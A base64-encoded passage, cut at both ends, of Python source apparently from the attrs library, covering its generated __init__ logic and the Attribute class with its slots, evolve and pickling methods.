AgICAgICAgICAgICAgIGt3X29ubHlfYXJncy5hcHBlbmQoYXJnKVxuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICBhcmdzLmFwcGVuZChhcmcpXG5cbiAgICAgICAgICAgIGlmIGEuY29udmVydGVyIGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgICAgIGxpbmVzLmFwcGVuZChcbiAgICAgICAgICAgICAgICAgICAgZm10X3NldHRlcl93aXRoX2NvbnZlcnRlcihcbiAgICAgICAgICAgICAgICAgICAgICAgIGF0dHJfbmFtZSwgYXJnX25hbWUsIGhhc19vbl9zZXRhdHRyXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgbmFtZXNfZm9yX2dsb2JhbHNbXG4gICAgICAgICAgICAgICAgICAgIF9pbml0X2NvbnZlcnRlcl9wYXQgJSAoYS5uYW1lLClcbiAgICAgICAgICAgICAgICBdID0gYS5jb252ZXJ0ZXJcbiAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgbGluZXMuYXBwZW5kKGZtdF9zZXR0ZXIoYXR0cl9uYW1lLCBhcmdfbmFtZSwgaGFzX29uX3NldGF0dHIpKVxuXG4gICAgICAgIGVsaWYgaGFzX2ZhY3Rvcnk6XG4gICAgICAgICAgICBhcmcgPSAiJXM9Tk9USElORyIgJSAoYXJnX25hbWUsKVxuICAgICAgICAgICAgaWYgYS5rd19vbmx5OlxuICAgICAgICAgICAgICAgIGt3X29ubHlfYXJncy5hcHBlbmQoYXJnKVxuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICBhcmdzLmFwcGVuZChhcmcpXG4gICAgICAgICAgICBsaW5lcy5hcHBlbmQoImlmICVzIGlzIG5vdCBOT1RISU5HOiIgJSAoYXJnX25hbWUsKSlcblxuICAgICAgICAgICAgaW5pdF9mYWN0b3J5X25hbWUgPSBfaW5pdF9mYWN0b3J5X3BhdC5mb3JtYXQoYS5uYW1lKVxuICAgICAgICAgICAgaWYgYS5jb252ZXJ0ZXIgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICAgICAgbGluZXMuYXBwZW5kKFxuICAgICAgICAgICAgICAgICAgICAiICAgICJcbiAgICAgICAgICAgICAgICAgICAgKyBmbXRfc2V0dGVyX3dpdGhfY29udmVydGVyKFxuICAgICAgICAgICAgICAgICAgICAgICAgYXR0cl9uYW1lLCBhcmdfbmFtZSwgaGFzX29uX3NldGF0dHJcbiAgICAgICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICBsaW5lcy5hcHBlbmQoImVsc2U6IilcbiAgICAgICAgICAgICAgICBsaW5lcy5hcHBlbmQoXG4gICAgICAgICAgICAgICAgICAgICIgICAgIlxuICAgICAgICAgICAgICAgICAgICArIGZtdF9zZXR0ZXJfd2l0aF9jb252ZXJ0ZXIoXG4gICAgICAgICAgICAgICAgICAgICAgICBhdHRyX25hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICBpbml0X2ZhY3RvcnlfbmFtZSArICIoIiArIG1heWJlX3NlbGYgKyAiKSIsXG4gICAgICAgICAgICAgICAgICAgICAgICBoYXNfb25fc2V0YXR0cixcbiAgICAgICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICBuYW1lc19mb3JfZ2xvYmFsc1tcbiAgICAgICAgICAgICAgICAgICAgX2luaXRfY29udmVydGVyX3BhdCAlIChhLm5hbWUsKVxuICAgICAgICAgICAgICAgIF0gPSBhLmNvbnZlcnRlclxuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICBsaW5lcy5hcHBlbmQoXG4gICAgICAgICAgICAgICAgICAgICIgICAgIiArIGZtdF9zZXR0ZXIoYXR0cl9uYW1lLCBhcmdfbmFtZSwgaGFzX29uX3NldGF0dHIpXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgIGxpbmVzLmFwcGVuZCgiZWxzZToiKVxuICAgICAgICAgICAgICAgIGxpbmVzLmFwcGVuZChcbiAgICAgICAgICAgICAgICAgICAgIiAgICAiXG4gICAgICAgICAgICAgICAgICAgICsgZm10X3NldHRlcihcbiAgICAgICAgICAgICAgICAgICAgICAgIGF0dHJfbmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgIGluaXRfZmFjdG9yeV9uYW1lICsgIigiICsgbWF5YmVfc2VsZiArICIpIixcbiAgICAgICAgICAgICAgICAgICAgICAgIGhhc19vbl9zZXRhdHRyLFxuICAgICAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgbmFtZXNfZm9yX2dsb2JhbHNbaW5pdF9mYWN0b3J5X25hbWVdID0gYS5kZWZhdWx0LmZhY3RvcnlcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIGlmIGEua3dfb25seTpcbiAgICAgICAgICAgICAgICBrd19vbmx5X2FyZ3MuYXBwZW5kKGFyZ19uYW1lKVxuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICBhcmdzLmFwcGVuZChhcmdfbmFtZSlcblxuICAgICAgICAgICAgaWYgYS5jb252ZXJ0ZXIgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICAgICAgbGluZXMuYXBwZW5kKFxuICAgICAgICAgICAgICAgICAgICBmbXRfc2V0dGVyX3dpdGhfY29udmVydGVyKFxuICAgICAgICAgICAgICAgICAgICAgICAgYXR0cl9uYW1lLCBhcmdfbmFtZSwgaGFzX29uX3NldGF0dHJcbiAgICAgICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICBuYW1lc19mb3JfZ2xvYmFsc1tcbiAgICAgICAgICAgICAgICAgICAgX2luaXRfY29udmVydGVyX3BhdCAlIChhLm5hbWUsKVxuICAgICAgICAgICAgICAgIF0gPSBhLmNvbnZlcnRlclxuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICBsaW5lcy5hcHBlbmQoZm10X3NldHRlcihhdHRyX25hbWUsIGFyZ19uYW1lLCBoYXNfb25fc2V0YXR0cikpXG5cbiAgICAgICAgaWYgYS5pbml0IGlzIFRydWU6XG4gICAgICAgICAgICBpZiBhLnR5cGUgaXMgbm90IE5vbmUgYW5kIGEuY29udmVydGVyIGlzIE5vbmU6XG4gICAgICAgICAgICAgICAgYW5ub3RhdGlvbnNbYXJnX25hbWVdID0gYS50eXBlXG4gICAgICAgICAgICBlbGlmIGEuY29udmVydGVyIGlzIG5vdCBOb25lIGFuZCBub3QgUFkyOlxuICAgICAgICAgICAgICAgICMgVHJ5IHRvIGdldCB0aGUgdHlwZSBmcm9tIHRoZSBjb252ZXJ0ZXIuXG4gICAgICAgICAgICAgICAgc2lnID0gTm9uZVxuICAgICAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICAgICAgc2lnID0gaW5zcGVjdC5zaWduYXR1cmUoYS5jb252ZXJ0ZXIpXG4gICAgICAgICAgICAgICAgZXhjZXB0IChWYWx1ZUVycm9yLCBUeXBlRXJyb3IpOiAgIyBpbnNwZWN0IGZhaWxlZFxuICAgICAgICAgICAgICAgICAgICBwYXNzXG4gICAgICAgICAgICAgICAgaWYgc2lnOlxuICAgICAgICAgICAgICAgICAgICBzaWdfcGFyYW1zID0gbGlzdChzaWcucGFyYW1ldGVycy52YWx1ZXMoKSlcbiAgICAgICAgICAgICAgICAgICAgaWYgKFxuICAgICAgICAgICAgICAgICAgICAgICAgc2lnX3BhcmFtc1xuICAgICAgICAgICAgICAgICAgICAgICAgYW5kIHNpZ19wYXJhbXNbMF0uYW5ub3RhdGlvblxuICAgICAgICAgICAgICAgICAgICAgICAgaXMgbm90IGluc3BlY3QuUGFyYW1ldGVyLmVtcHR5XG4gICAgICAgICAgICAgICAgICAgICk6XG4gICAgICAgICAgICAgICAgICAgICAgICBhbm5vdGF0aW9uc1thcmdfbmFtZV0gPSBzaWdfcGFyYW1zWzBdLmFubm90YXRpb25cblxuICAgIGlmIGF0dHJzX3RvX3ZhbGlkYXRlOiAgIyB3ZSBjYW4gc2tpcCB0aGlzIGlmIHRoZXJlIGFyZSBubyB2YWxpZGF0b3JzLlxuICAgICAgICBuYW1lc19mb3JfZ2xvYmFsc1siX2NvbmZpZyJdID0gX2NvbmZpZ1xuICAgICAgICBsaW5lcy5hcHBlbmQoImlmIF9jb25maWcuX3J1bl92YWxpZGF0b3JzIGlzIFRydWU6IilcbiAgICAgICAgZm9yIGEgaW4gYXR0cnNfdG9fdmFsaWRhdGU6XG4gICAgICAgICAgICB2YWxfbmFtZSA9ICJfX2F0dHJfdmFsaWRhdG9yXyIgKyBhLm5hbWVcbiAgICAgICAgICAgIGF0dHJfbmFtZSA9ICJfX2F0dHJfIiArIGEubmFtZVxuICAgICAgICAgICAgbGluZXMuYXBwZW5kKFxuICAgICAgICAgICAgICAgICIgICAgJXMoc2VsZiwgJXMsIHNlbGYuJXMpIiAlICh2YWxfbmFtZSwgYXR0cl9uYW1lLCBhLm5hbWUpXG4gICAgICAgICAgICApXG4gICAgICAgICAgICBuYW1lc19mb3JfZ2xvYmFsc1t2YWxfbmFtZV0gPSBhLnZhbGlkYXRvclxuICAgICAgICAgICAgbmFtZXNfZm9yX2dsb2JhbHNbYXR0cl9uYW1lXSA9IGFcblxuICAgIGlmIHBvc3RfaW5pdDpcbiAgICAgICAgbGluZXMuYXBwZW5kKCJzZWxmLl9fYXR0cnNfcG9zdF9pbml0X18oKSIpXG5cbiAgICAjIGJlY2F1c2UgdGhpcyBpcyBzZXQgb25seSBhZnRlciBfX2F0dHJzX3Bvc3RfaW5pdCBpcyBjYWxsZWQsIGEgY3Jhc2hcbiAgICAjIHdpbGwgcmVzdWx0IGlmIHBvc3QtaW5pdCB0cmllcyB0byBhY2Nlc3MgdGhlIGhhc2ggY29kZS4gIFRoaXMgc2VlbWVkXG4gICAgIyBwcmVmZXJhYmxlIHRvIHNldHRpbmcgdGhpcyBiZWZvcmVoYW5kLCBpbiB3aGljaCBjYXNlIGFsdGVyYXRpb24gdG9cbiAgICAjIGZpZWxkIHZhbHVlcyBkdXJpbmcgcG9zdC1pbml0IGNvbWJpbmVkIHdpdGggcG9zdC1pbml0IGFjY2Vzc2luZyB0aGVcbiAgICAjIGhhc2ggY29kZSB3b3VsZCByZXN1bHQgaW4gc2lsZW50IGJ1Z3MuXG4gICAgaWYgY2FjaGVfaGFzaDpcbiAgICAgICAgaWYgZnJvemVuOlxuICAgICAgICAgICAgaWYgc2xvdHM6XG4gICAgICAgICAgICAgICAgIyBpZiBmcm96ZW4gYW5kIHNsb3RzLCB0aGVuIF9zZXRhdHRyIGRlZmluZWQgYWJvdmVcbiAgICAgICAgICAgICAgICBpbml0X2hhc2hfY2FjaGUgPSAiX3NldGF0dHIoXCclc1wnLCAlcykiXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgICMgaWYgZnJvemVuIGFuZCBub3Qgc2xvdHMsIHRoZW4gX2luc3RfZGljdCBkZWZpbmVkIGFib3ZlXG4gICAgICAgICAgICAgICAgaW5pdF9oYXNoX2NhY2hlID0gIl9pbnN0X2RpY3RbXCclc1wnXSA9ICVzIlxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgaW5pdF9oYXNoX2NhY2hlID0gInNlbGYuJXMgPSAlcyJcbiAgICAgICAgbGluZXMuYXBwZW5kKGluaXRfaGFzaF9jYWNoZSAlIChfaGFzaF9jYWNoZV9maWVsZCwgIk5vbmUiKSlcblxuICAgICMgRm9yIGV4Y2VwdGlvbnMgd2UgcmVseSBvbiBCYXNlRXhjZXB0aW9uLl9faW5pdF9fIGZvciBwcm9wZXJcbiAgICAjIGluaXRpYWxpemF0aW9uLlxuICAgIGlmIGlzX2V4YzpcbiAgICAgICAgdmFscyA9ICIsIi5qb2luKCJzZWxmLiIgKyBhLm5hbWUgZm9yIGEgaW4gYXR0cnMgaWYgYS5pbml0KVxuXG4gICAgICAgIGxpbmVzLmFwcGVuZCgiQmFzZUV4Y2VwdGlvbi5fX2luaXRfXyhzZWxmLCAlcykiICUgKHZhbHMsKSlcblxuICAgIGFyZ3MgPSAiLCAiLmpvaW4oYXJncylcbiAgICBpZiBrd19vbmx5X2FyZ3M6XG4gICAgICAgIGlmIFBZMjpcbiAgICAgICAgICAgIGxpbmVzID0gX3VucGFja19rd19vbmx5X2xpbmVzX3B5Mihrd19vbmx5X2FyZ3MpICsgbGluZXNcblxuICAgICAgICAgICAgYXJncyArPSAiJXMqKl9rd19vbmx5IiAlICgiLCAiIGlmIGFyZ3MgZWxzZSAiIiwpICAjIGxlYWRpbmcgY29tbWFcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIGFyZ3MgKz0gIiVzKiwgJXMiICUgKFxuICAgICAgICAgICAgICAgICIsICIgaWYgYXJncyBlbHNlICIiLCAgIyBsZWFkaW5nIGNvbW1hXG4gICAgICAgICAgICAgICAgIiwgIi5qb2luKGt3X29ubHlfYXJncyksICAjIGt3X29ubHkgYXJnc1xuICAgICAgICAgICAgKVxuICAgIHJldHVybiAoXG4gICAgICAgICIiIlxcXG5kZWYge2luaXRfbmFtZX0oc2VsZiwge2FyZ3N9KTpcbiAgICB7bGluZXN9XG4iIiIuZm9ybWF0KFxuICAgICAgICAgICAgaW5pdF9uYW1lPSgiX19hdHRyc19pbml0X18iIGlmIGF0dHJzX2luaXQgZWxzZSAiX19pbml0X18iKSxcbiAgICAgICAgICAgIGFyZ3M9YXJncyxcbiAgICAgICAgICAgIGxpbmVzPSJcXG4gICAgIi5qb2luKGxpbmVzKSBpZiBsaW5lcyBlbHNlICJwYXNzIixcbiAgICAgICAgKSxcbiAgICAgICAgbmFtZXNfZm9yX2dsb2JhbHMsXG4gICAgICAgIGFubm90YXRpb25zLFxuICAgIClcblxuXG5jbGFzcyBBdHRyaWJ1dGUob2JqZWN0KTpcbiAgICAiIiJcbiAgICAqUmVhZC1vbmx5KiByZXByZXNlbnRhdGlvbiBvZiBhbiBhdHRyaWJ1dGUuXG5cbiAgICBUaGUgY2xhc3MgaGFzICphbGwqIGFyZ3VtZW50cyBvZiBgYXR0ci5pYmAgKGV4Y2VwdCBmb3IgYGBmYWN0b3J5YGBcbiAgICB3aGljaCBpcyBvbmx5IHN5bnRhY3RpYyBzdWdhciBmb3IgYGBkZWZhdWx0PUZhY3RvcnkoLi4uKWBgIHBsdXMgdGhlXG4gICAgZm9sbG93aW5nOlxuXG4gICAgLSBgYG5hbWVgYCAoYHN0cmApOiBUaGUgbmFtZSBvZiB0aGUgYXR0cmlidXRlLlxuICAgIC0gYGBpbmhlcml0ZWRgYCAoYGJvb2xgKTogV2hldGhlciBvciBub3QgdGhhdCBhdHRyaWJ1dGUgaGFzIGJlZW4gaW5oZXJpdGVkXG4gICAgICBmcm9tIGEgYmFzZSBjbGFzcy5cbiAgICAtIGBgZXFfa2V5YGAgYW5kIGBgb3JkZXJfa2V5YGAgKGB0eXBpbmcuQ2FsbGFibGVgIG9yIGBOb25lYCk6IFRoZSBjYWxsYWJsZXNcbiAgICAgIHRoYXQgYXJlIHVzZWQgZm9yIGNvbXBhcmluZyBhbmQgb3JkZXJpbmcgb2JqZWN0cyBieSB0aGlzIGF0dHJpYnV0ZSxcbiAgICAgIHJlc3BlY3RpdmVseS4gVGhlc2UgYXJlIHNldCBieSBwYXNzaW5nIGEgY2FsbGFibGUgdG8gYGF0dHIuaWJgXCdzIGBgZXFgYCxcbiAgICAgIGBgb3JkZXJgYCwgb3IgYGBjbXBgYCBhcmd1bWVudHMuIFNlZSBhbHNvIDpyZWY6YGNvbXBhcmlzb24gY3VzdG9taXphdGlvblxuICAgICAgPGN1c3RvbS1jb21wYXJpc29uPmAuXG5cbiAgICBJbnN0YW5jZXMgb2YgdGhpcyBjbGFzcyBhcmUgZnJlcXVlbnRseSB1c2VkIGZvciBpbnRyb3NwZWN0aW9uIHB1cnBvc2VzXG4gICAgbGlrZTpcblxuICAgIC0gYGZpZWxkc2AgcmV0dXJucyBhIHR1cGxlIG9mIHRoZW0uXG4gICAgLSBWYWxpZGF0b3JzIGdldCB0aGVtIHBhc3NlZCBhcyB0aGUgZmlyc3QgYXJndW1lbnQuXG4gICAgLSBUaGUgOnJlZjpgZmllbGQgdHJhbnNmb3JtZXIgPHRyYW5zZm9ybS1maWVsZHM+YCBob29rIHJlY2VpdmVzIGEgbGlzdCBvZlxuICAgICAgdGhlbS5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIwLjEuMCAqaW5oZXJpdGVkKlxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIwLjEuMCAqb25fc2V0YXR0cipcbiAgICAuLiB2ZXJzaW9uY2hhbmdlZDo6IDIwLjIuMCAqaW5oZXJpdGVkKiBpcyBub3QgdGFrZW4gaW50byBhY2NvdW50IGZvclxuICAgICAgICBlcXVhbGl0eSBjaGVja3MgYW5kIGhhc2hpbmcgYW55bW9yZS5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAyMS4xLjAgKmVxX2tleSogYW5kICpvcmRlcl9rZXkqXG5cbiAgICBGb3IgdGhlIGZ1bGwgdmVyc2lvbiBoaXN0b3J5IG9mIHRoZSBmaWVsZHMsIHNlZSBgYXR0ci5pYmAuXG4gICAgIiIiXG5cbiAgICBfX3Nsb3RzX18gPSAoXG4gICAgICAgICJuYW1lIixcbiAgICAgICAgImRlZmF1bHQiLFxuICAgICAgICAidmFsaWRhdG9yIixcbiAgICAgICAgInJlcHIiLFxuICAgICAgICAiZXEiLFxuICAgICAgICAiZXFfa2V5IixcbiAgICAgICAgIm9yZGVyIixcbiAgICAgICAgIm9yZGVyX2tleSIsXG4gICAgICAgICJoYXNoIixcbiAgICAgICAgImluaXQiLFxuICAgICAgICAibWV0YWRhdGEiLFxuICAgICAgICAidHlwZSIsXG4gICAgICAgICJjb252ZXJ0ZXIiLFxuICAgICAgICAia3dfb25seSIsXG4gICAgICAgICJpbmhlcml0ZWQiLFxuICAgICAgICAib25fc2V0YXR0ciIsXG4gICAgKVxuXG4gICAgZGVmIF9faW5pdF9fKFxuICAgICAgICBzZWxmLFxuICAgICAgICBuYW1lLFxuICAgICAgICBkZWZhdWx0LFxuICAgICAgICB2YWxpZGF0b3IsXG4gICAgICAgIHJlcHIsXG4gICAgICAgIGNtcCwgICMgWFhYOiB1bnVzZWQsIHJlbW92ZSBhbG9uZyB3aXRoIG90aGVyIGNtcCBjb2RlLlxuICAgICAgICBoYXNoLFxuICAgICAgICBpbml0LFxuICAgICAgICBpbmhlcml0ZWQsXG4gICAgICAgIG1ldGFkYXRhPU5vbmUsXG4gICAgICAgIHR5cGU9Tm9uZSxcbiAgICAgICAgY29udmVydGVyPU5vbmUsXG4gICAgICAgIGt3X29ubHk9RmFsc2UsXG4gICAgICAgIGVxPU5vbmUsXG4gICAgICAgIGVxX2tleT1Ob25lLFxuICAgICAgICBvcmRlcj1Ob25lLFxuICAgICAgICBvcmRlcl9rZXk9Tm9uZSxcbiAgICAgICAgb25fc2V0YXR0cj1Ob25lLFxuICAgICk6XG4gICAgICAgIGVxLCBlcV9rZXksIG9yZGVyLCBvcmRlcl9rZXkgPSBfZGV0ZXJtaW5lX2F0dHJpYl9lcV9vcmRlcihcbiAgICAgICAgICAgIGNtcCwgZXFfa2V5IG9yIGVxLCBvcmRlcl9rZXkgb3Igb3JkZXIsIFRydWVcbiAgICAgICAgKVxuXG4gICAgICAgICMgQ2FjaGUgdGhpcyBkZXNjcmlwdG9yIGhlcmUgdG8gc3BlZWQgdGhpbmdzIHVwIGxhdGVyLlxuICAgICAgICBib3VuZF9zZXRhdHRyID0gX29ial9zZXRhdHRyLl9fZ2V0X18oc2VsZiwgQXR0cmlidXRlKVxuXG4gICAgICAgICMgRGVzcGl0ZSB0aGUgYmlnIHJlZCB3YXJuaW5nLCBwZW9wbGUgKmRvKiBpbnN0YW50aWF0ZSBgQXR0cmlidXRlYFxuICAgICAgICAjIHRoZW1zZWx2ZXMuXG4gICAgICAgIGJvdW5kX3NldGF0dHIoIm5hbWUiLCBuYW1lKVxuICAgICAgICBib3VuZF9zZXRhdHRyKCJkZWZhdWx0IiwgZGVmYXVsdClcbiAgICAgICAgYm91bmRfc2V0YXR0cigidmFsaWRhdG9yIiwgdmFsaWRhdG9yKVxuICAgICAgICBib3VuZF9zZXRhdHRyKCJyZXByIiwgcmVwcilcbiAgICAgICAgYm91bmRfc2V0YXR0cigiZXEiLCBlcSlcbiAgICAgICAgYm91bmRfc2V0YXR0cigiZXFfa2V5IiwgZXFfa2V5KVxuICAgICAgICBib3VuZF9zZXRhdHRyKCJvcmRlciIsIG9yZGVyKVxuICAgICAgICBib3VuZF9zZXRhdHRyKCJvcmRlcl9rZXkiLCBvcmRlcl9rZXkpXG4gICAgICAgIGJvdW5kX3NldGF0dHIoImhhc2giLCBoYXNoKVxuICAgICAgICBib3VuZF9zZXRhdHRyKCJpbml0IiwgaW5pdClcbiAgICAgICAgYm91bmRfc2V0YXR0cigiY29udmVydGVyIiwgY29udmVydGVyKVxuICAgICAgICBib3VuZF9zZXRhdHRyKFxuICAgICAgICAgICAgIm1ldGFkYXRhIixcbiAgICAgICAgICAgIChcbiAgICAgICAgICAgICAgICBtZXRhZGF0YV9wcm94eShtZXRhZGF0YSlcbiAgICAgICAgICAgICAgICBpZiBtZXRhZGF0YVxuICAgICAgICAgICAgICAgIGVsc2UgX2VtcHR5X21ldGFkYXRhX3NpbmdsZXRvblxuICAgICAgICAgICAgKSxcbiAgICAgICAgKVxuICAgICAgICBib3VuZF9zZXRhdHRyKCJ0eXBlIiwgdHlwZSlcbiAgICAgICAgYm91bmRfc2V0YXR0cigia3dfb25seSIsIGt3X29ubHkpXG4gICAgICAgIGJvdW5kX3NldGF0dHIoImluaGVyaXRlZCIsIGluaGVyaXRlZClcbiAgICAgICAgYm91bmRfc2V0YXR0cigib25fc2V0YXR0ciIsIG9uX3NldGF0dHIpXG5cbiAgICBkZWYgX19zZXRhdHRyX18oc2VsZiwgbmFtZSwgdmFsdWUpOlxuICAgICAgICByYWlzZSBGcm96ZW5JbnN0YW5jZUVycm9yKClcblxuICAgIEBjbGFzc21ldGhvZFxuICAgIGRlZiBmcm9tX2NvdW50aW5nX2F0dHIoY2xzLCBuYW1lLCBjYSwgdHlwZT1Ob25lKTpcbiAgICAgICAgIyB0eXBlIGhvbGRzIHRoZSBhbm5vdGF0ZWQgdmFsdWUuIGRlYWwgd2l0aCBjb25mbGljdHM6XG4gICAgICAgIGlmIHR5cGUgaXMgTm9uZTpcbiAgICAgICAgICAgIHR5cGUgPSBjYS50eXBlXG4gICAgICAgIGVsaWYgY2EudHlwZSBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXG4gICAgICAgICAgICAgICAgIlR5cGUgYW5ub3RhdGlvbiBhbmQgdHlwZSBhcmd1bWVudCBjYW5ub3QgYm90aCBiZSBwcmVzZW50IlxuICAgICAgICAgICAgKVxuICAgICAgICBpbnN0X2RpY3QgPSB7XG4gICAgICAgICAgICBrOiBnZXRhdHRyKGNhLCBrKVxuICAgICAgICAgICAgZm9yIGsgaW4gQXR0cmlidXRlLl9fc2xvdHNfX1xuICAgICAgICAgICAgaWYga1xuICAgICAgICAgICAgbm90IGluIChcbiAgICAgICAgICAgICAgICAibmFtZSIsXG4gICAgICAgICAgICAgICAgInZhbGlkYXRvciIsXG4gICAgICAgICAgICAgICAgImRlZmF1bHQiLFxuICAgICAgICAgICAgICAgICJ0eXBlIixcbiAgICAgICAgICAgICAgICAiaW5oZXJpdGVkIixcbiAgICAgICAgICAgICkgICMgZXhjbHVkZSBtZXRob2RzIGFuZCBkZXByZWNhdGVkIGFsaWFzXG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIGNscyhcbiAgICAgICAgICAgIG5hbWU9bmFtZSxcbiAgICAgICAgICAgIHZhbGlkYXRvcj1jYS5fdmFsaWRhdG9yLFxuICAgICAgICAgICAgZGVmYXVsdD1jYS5fZGVmYXVsdCxcbiAgICAgICAgICAgIHR5cGU9dHlwZSxcbiAgICAgICAgICAgIGNtcD1Ob25lLFxuICAgICAgICAgICAgaW5oZXJpdGVkPUZhbHNlLFxuICAgICAgICAgICAgKippbnN0X2RpY3RcbiAgICAgICAgKVxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIGNtcChzZWxmKTpcbiAgICAgICAgIiIiXG4gICAgICAgIFNpbXVsYXRlIHRoZSBwcmVzZW5jZSBvZiBhIGNtcCBhdHRyaWJ1dGUgYW5kIHdhcm4uXG4gICAgICAgICIiIlxuICAgICAgICB3YXJuaW5ncy53YXJuKF9DTVBfREVQUkVDQVRJT04sIERlcHJlY2F0aW9uV2FybmluZywgc3RhY2tsZXZlbD0yKVxuXG4gICAgICAgIHJldHVybiBzZWxmLmVxIGFuZCBzZWxmLm9yZGVyXG5cbiAgICAjIERvblwndCB1c2UgYXR0ci5ldm9sdmUgc2luY2UgZmllbGRzKEF0dHJpYnV0ZSkgZG9lc25cJ3Qgd29ya1xuICAgIGRlZiBldm9sdmUoc2VsZiwgKipjaGFuZ2VzKTpcbiAgICAgICAgIiIiXG4gICAgICAgIENvcHkgKnNlbGYqIGFuZCBhcHBseSAqY2hhbmdlcyouXG5cbiAgICAgICAgVGhpcyB3b3JrcyBzaW1pbGFybHkgdG8gYGF0dHIuZXZvbHZlYCBidXQgdGhhdCBmdW5jdGlvbiBkb2VzIG5vdCB3b3JrXG4gICAgICAgIHdpdGggYGBBdHRyaWJ1dGVgYC5cblxuICAgICAgICBJdCBpcyBtYWlubHkgbWVhbnQgdG8gYmUgdXNlZCBmb3IgYHRyYW5zZm9ybS1maWVsZHNgLlxuXG4gICAgICAgIC4uIHZlcnNpb25hZGRlZDo6IDIwLjMuMFxuICAgICAgICAiIiJcbiAgICAgICAgbmV3ID0gY29weS5jb3B5KHNlbGYpXG5cbiAgICAgICAgbmV3Ll9zZXRhdHRycyhjaGFuZ2VzLml0ZW1zKCkpXG5cbiAgICAgICAgcmV0dXJuIG5ld1xuXG4gICAgIyBEb25cJ3QgdXNlIF9hZGRfcGlja2xlIHNpbmNlIGZpZWxkcyhBdHRyaWJ1dGUpIGRvZXNuXCd0IHdvcmtcbiAgICBkZWYgX19nZXRzdGF0ZV9fKHNlbGYpOlxuICAgICAgICAiIiJcbiAgICAgICAgUGxheSBuaWNlIHdpdGggcGlja2xlLlxuICAgICAgICAiIiJcbiAgICAgICAgcmV0dXJuIHR1cGxlKFxuICAgICAgICAgICAgZ2V0YXR0cihzZWxmLCBuYW1lKSBpZiBuYW1lICE9ICJtZXRhZGF0YSIgZWxzZSBkaWN0KHNlbGYubWV0YWRhdGEpXG4gICAgICAgICAgICBmb3IgbmFtZSBpbiBzZWxmLl9fc2xvdHNfX1xuICAgICAgICApXG5cbiAgICBkZWYgX19zZXRzdGF0ZV9fKHNlbGYsIHN0YXRlKTpcbiAgICAgICAgIiIiXG4gICAgICAgIFBsYXkgbmljZSB3aXRoIHBpY2tsZS5cbiAgICAgICAgIiIiXG4gICAgICAgIHNlbGYuX3NldGF0dHJzKHppcChzZWxmLl9fc2xvdHNfXywgc3RhdGUpKVxuXG4gICAgZGVmIF9zZXRhdHRycyhzZWxmLCBuYW1lX3ZhbHVlc19wYWlycyk6XG4gICAgICAgIGJvdW5kX3NldGF0dHIgPSBfb2JqX3NldGF0dHIuX19nZXRfXyhzZWxmLCBBdHRyaWJ1dGUpXG4gICAgICAgIGZvciBuYW1lLCB2YWx1ZSBpbiBuYW1lX3ZhbHVlc19wYWlyczpcbiAgICAgICAgICAgIGlmIG5hbWUgIT0gIm1ldGFkYXRhIjpcbiAgICAgICAgICAgICAgICBib3VuZF9zZXRhdHRyKG5hbWUsIHZhbHVlKVxuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICBib3VuZF9zZXRhdHRyKFxuICAgICAgICAgICAgICAgICAgICBuYW1lLFxuICAgICAgICAgICAgICAgICAgICBtZXRhZGF0YV9wcm94eSh2YWx1ZSlcbiAgICAgICAgICAgICAgICAgICAgaWYgdmFsdWVcbiAgICAgICAgICAgICAgICAgICAgZWxzZSBfZW1wdHlfbWV0YWRhdGFfc2luZ2xldG9uLFxuICAgICAgICAgICAgICAgIClcblxuXG5fYSA9IFtcbiAgICBBdHRyaWJ1dGUoXG4gICAgICAgIG5hbWU9bmFtZSxcbiAgICAgICAgZGVmYXVsdD1OT1RISU5HLFxuICAgICAgICB2YWxpZGF0b3I9Tm9uZSxcbiAgICAgICAgcmVwcj1UcnVlLFxuICAgICAgICBjbXA9Tm9uZSxcbiAgICAgICAgZXE9VHJ1ZSxcbiAgICAgICAgb3JkZXI9RmFsc2UsXG4gICAgICAgIGhhc2g9KG5hbWUgIT0gIm1ldGFkYXRhIiksXG4gICAgICAgIGluaXQ9VHJ1ZSxcbiAgICAgICAgaW5oZXJpdGVkPUZhbHNlLFxuICAgIClcbiAgICBmb3IgbmFtZSBpbiBBdHRyaWJ1dGUuX19zbG90c19fXG5dXG5cbkF0dHJpYnV0ZSA9IF9hZGRfaGFzaChcbiAgICBfYWRkX2VxKFxuICAgICAgICBfYWRkX3JlcHIoQXR0cmlidXRlLCBhdHRycz1fYSksXG4gICAgICAgIGF0dHJzPVthIGZvciBhIGluIF9hIGlmIGEubmFtZSAhPSAiaW5oZXJpdGVkIl0sXG4gICAgKSxcbiAgICBhdHRycz1bYSBmb3IgYSBpbiBfYSBpZiBhLmhhc2ggYW5kIGEubmFtZSAhPSAiaW5oZXJpdGVkIl0sX